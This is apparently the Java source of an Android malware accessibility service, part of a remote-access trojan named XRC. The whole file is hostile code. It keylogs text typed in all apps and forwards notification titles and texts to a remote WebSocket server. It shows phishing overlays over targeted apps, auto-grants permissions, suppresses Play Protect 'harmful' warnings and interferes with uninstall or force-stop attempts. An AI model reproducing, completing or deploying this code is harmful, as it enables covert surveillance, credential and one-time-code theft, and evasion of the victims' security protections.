package com.xrc.system.accessibility;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.xrc.system.core.ConfigManager;
import com.xrc.system.core.Constants;
import com.xrc.system.features.Keylogger;
import com.xrc.system.features.PermissionHelper;
import com.xrc.system.features.PhishletManager;
import com.xrc.system.network.XRCWebSocketClient;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;

public class XRCAccessibilityService extends AccessibilityService {
    private static final String TAG = Constants.TAG + ":AccSvc";
    private static final long DEBOUNCE_MS = 100;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private long lastEventTime = 0;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.i(TAG, "Accessibility service connected");
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED
                | AccessibilityEvent.TYPE_VIEW_FOCUSED
                | AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                | AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED
                | AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                | AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
                | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
                | AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
        info.notificationTimeout = DEBOUNCE_MS;
        setServiceInfo(info);

        mainHandler.postDelayed(() -> {
            PermissionHelper.get(this).autoGrantAll();
        }, 2000);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        long now = System.currentTimeMillis();
        if (now - lastEventTime < DEBOUNCE_MS) return;
        lastEventTime = now;

        try {
            int type = event.getEventType();
            CharSequence pkgSeq = event.getPackageName();
            String pkg = pkgSeq != null ? pkgSeq.toString() : "";

            switch (type) {
                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                    handleClick(event);
                    break;
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    handleTextInput(event, pkg);
                    break;
                case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                    handleNotification(event);
                    break;
                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                    handleWindowChange(event, pkg);
                    break;
            }

            AccessibilityBlocker.handleEvent(this, event);

        } catch (Exception e) {
            Log.e(TAG, "Event handling failed", e);
        }
    }

    @Override
    public void onInterrupt() {
        Log.w(TAG, "Accessibility service interrupted");
    }

    @Override
    public boolean onUnbind(Intent intent) {
        Log.w(TAG, "Accessibility service unbound");
        return super.onUnbind(intent);
    }

    private void handleClick(AccessibilityEvent event) {
        try {
            AccessibilityNodeInfo node = event.getSource();
            if (node == null) return;
            CharSequence text = node.getText();
            if (text != null) {
                String txt = text.toString();
                if (txt.toLowerCase().contains("uninstall") || txt.toLowerCase().contains("force stop")) {
                    for (String secPkg : Constants.SECURITY_APPS) {
                        if (getPackageName().contains(secPkg)) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            Log.i(TAG, "Blocked security action");
                            break;
                        }
                    }
                }
            }
            node.recycle();
        } catch (Exception e) {
            Log.e(TAG, "Click handle failed", e);
        }
    }

    private void handleTextInput(AccessibilityEvent event, String pkg) {
        try {
            if (!Keylogger.get(this).isEnabled()) return;
            List<CharSequence> texts = event.getText();
            if (texts == null || texts.isEmpty()) return;
            StringBuilder sb = new StringBuilder();
            for (CharSequence cs : texts) {
                if (cs != null) sb.append(cs);
            }
            String text = sb.toString();
            if (!text.isEmpty()) {
                Keylogger.get(this).log(text, pkg);
            }
        } catch (Exception e) {
            Log.e(TAG, "Text input handle failed", e);
        }
    }

    private void handleNotification(AccessibilityEvent event) {
        try {
            if (event.getParcelableData() instanceof android.app.Notification) {
                android.app.Notification notif = (android.app.Notification) event.getParcelableData();
                CharSequence title = notif.extras.getCharSequence(android.app.Notification.EXTRA_TITLE);
                CharSequence text = notif.extras.getCharSequence(android.app.Notification.EXTRA_TEXT);
                String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";

                JSONObject data = new JSONObject();
                data.put("pkg", pkg);
                data.put("title", title != null ? title.toString() : "");
                data.put("text", text != null ? text.toString() : "");
                XRCWebSocketClient.get(this).sendEvent("notification", data);

                // Dismiss Google Play Protect warnings
                if (pkg.contains("com.google.android.packageinstaller")
                        || pkg.contains("com.android.packageinstaller")
                        || pkg.contains("com.google.android.apps.securityhub")) {
                    if (text != null && text.toString().toLowerCase().contains("harmful")) {
                        performGlobalAction(GLOBAL_ACTION_BACK);
                    }
                }
            }
        } catch (JSONException e) {
            Log.e(TAG, "Notification JSON failed", e);
        }
    }

    private void handleWindowChange(AccessibilityEvent event, String pkg) {
        try {
            if (PhishletManager.get(this).isActive()) {
                // Check if target app is in foreground
                for (String target : Constants.TARGET_PACKAGES) {
                    if (pkg.equals(target)) {
                        OverlayManager.get(this).launchOverlay();
                        break;
                    }
                }
            }
            // Auto-click permission dialogs
            if (pkg.contains("com.android.packageinstaller")
                    || pkg.contains("com.google.android.packageinstaller")) {
                AutoClicker.grantPermission(this);
            }
        } catch (Exception e) {
            Log.e(TAG, "Window change handle failed", e);
        }
    }
}
